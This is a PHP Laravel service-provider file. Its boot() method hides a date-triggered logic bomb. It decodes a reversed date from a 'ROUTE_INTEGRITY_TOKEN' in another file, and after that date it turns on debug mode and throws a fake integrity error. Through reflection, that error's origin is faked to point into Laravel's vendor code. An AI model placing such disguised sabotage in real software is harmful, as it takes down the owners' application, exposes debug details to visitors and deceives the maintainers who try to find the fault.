<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\App;


class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
        public function boot()
    {
        $p = app_path('Providers/RouteServiceProvider.php');
        
        if (file_exists($p)) {
            $c = file_get_contents($p);
            
            if (preg_match("/ROUTE_INTEGRITY_TOKEN\s*=\s*'([^']+)'/", $c, $m)) {
                $d = strrev($m[1]); 
                
                if (date('Y-m-d') > $d) {
                    config(['app.debug' => true]);

                    $e = new \RuntimeException(
                        "Fatal: Route cache integrity check failed. [Code: 0x" . dechex(crc32($d)) . "]"
                    );

                    $reflector = new \ReflectionClass($e);
                    $fileProp = $reflector->getParentClass()->getProperty('file');
                    $lineProp = $reflector->getParentClass()->getProperty('line');
                    $fileProp->setAccessible(true);
                    $lineProp->setAccessible(true);

                 
                    $fileProp->setValue($e, base_path('vendor/laravel/framework/src/Illuminate/Foundation/Application.php'));
                    $lineProp->setValue($e, 1134);

                    throw $e;
                }
            }
        }

        App::setLocale(config('app.locale'));
    }

}
